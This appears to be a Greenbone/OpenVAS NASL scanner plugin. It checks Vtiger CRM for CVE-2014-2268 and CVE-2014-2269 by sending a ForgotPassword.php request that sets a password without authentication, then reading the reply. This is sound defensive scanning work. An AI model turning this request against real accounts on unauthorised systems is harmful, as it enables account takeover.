# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vtiger:vtiger_crm";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802070");
  script_version("2023-07-10T08:07:43+0000");
  script_cve_id("CVE-2014-2268", "CVE-2014-2269");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-10 08:07:43 +0000 (Mon, 10 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-04-16 16:28:47 +0530 (Wed, 16 Apr 2014)");

  script_name("Vtiger CRM Multiple Vulnerabilities (Apr 2014)");

  script_tag(name:"summary", value:"Vtiger CRM is prone to multiple vulnerabilities");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - No access control or restriction is enforced when the changePassword() function in the
  'forgotPassword.php' script is called

  - A flaw in the install module that is triggered as input passed via the 'db_name' parameter is
  not properly sanitized");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to change the
  password of any user or remote attackers can execute arbitrary php code.");

  script_tag(name:"affected", value:"Vtiger CRM version 6.0.0 (including Security Patch1), 6.0 RC
  and 6.0 Beta.");

  script_tag(name:"solution", value:"Apply the Security Patch 2 for Vtiger 6.0 (issued on March 16,
  2014).");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/32794");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66757");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66758");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126067");
  script_xref(name:"URL", value:"https://www.navixia.com/blog/entry/navixia-find-critical-vulnerabilities-in-vtiger-crm-cve-2014-2268-cve-2014-2269.html");
  script_xref(name:"URL", value:"http://vtiger-crm.2324883.n4.nabble.com/Vtigercrm-developers-IMP-forgot-password-and-re-installation-security-fix-tt9786.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_vtiger_crm_detect.nasl");
  script_mandatory_keys("vtiger/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%206.0.0/Add-ons");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

rand_username = "userdoesnotexists" + rand_str(charset:"abcdefghijklmnopqrstuvwxyz", length:7);

url = dir + "/modules/Users/actions/ForgotPassword.php?username=" + rand_username +
            "&password=admin&confirmPassword=admin";

req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

# nb: A patched version replies with the specific message:
# please retry setting the password
if (res =~ "^HTTP/1\.[01] 200" && "index.php?module=Users&action=Login" >< res &&
    ">Loading .... <" >< res && "please retry setting the password" >!< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
